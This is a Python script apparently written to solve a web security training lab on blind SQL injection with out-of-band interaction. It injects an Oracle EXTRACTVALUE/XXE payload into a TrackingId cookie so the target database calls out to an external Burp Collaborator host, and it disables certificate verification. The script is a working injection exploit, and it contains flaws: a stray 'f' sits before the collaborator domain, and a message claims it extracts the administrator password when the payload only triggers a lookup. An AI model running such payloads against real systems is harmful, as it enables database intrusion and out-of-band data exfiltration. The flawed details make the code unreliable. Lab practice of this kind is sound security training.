"""
  Lab: Blind SQL injection with out-of-band interaction

  Steps:
  1. Inject payload into 'TrackingId' cookie to make a DNS lookup to your burp collaborator domain
  2. Check your collaborator for incoming traffic

  Author: N00BCYB0T
"""
import argparse
import requests
from colorama import Fore
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', "--url", required=True, help='Target URL')
    parser.add_argument('--proxy', help='Proxy URL (e.g., http://127.0.0.1:8080)')
    parser.add_argument('--collaborator', required=True, help='Burp Collaborator domain')
    args = parser.parse_args()

    # Configure session with proxy if provided
    session = requests.session()
    if args.proxy:
        proxies = {
            "http": args.proxy,
            "https": args.proxy
        }
        session.proxies = proxies
    session.verify = False

    print("⦗#⦘ Injection point: " + Fore.YELLOW + "TrackingId")
    print(Fore.WHITE + "❯❯ Injecting payload to extract administrator password via DNS lookup.. ", end="", flush=True)

    payload = f"'||(SELECT EXTRACTVALUE(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY %25 remote SYSTEM \"http://f{args.collaborator}/\"> %25remote%3b]>'),'/l') FROM dual)-- -"
    cookies = { "TrackingId": payload }

    try:  
       session.get(f"{args.url}/filter?category=Pets", cookies=cookies)
        
    except:
        print(Fore.RED + "⦗!⦘ Failed to fetch the page with the injected payload through exception")
        exit(1)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 Check the DNS lookup in your burp collaborator")
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")

if __name__ == "__main__":
    main()
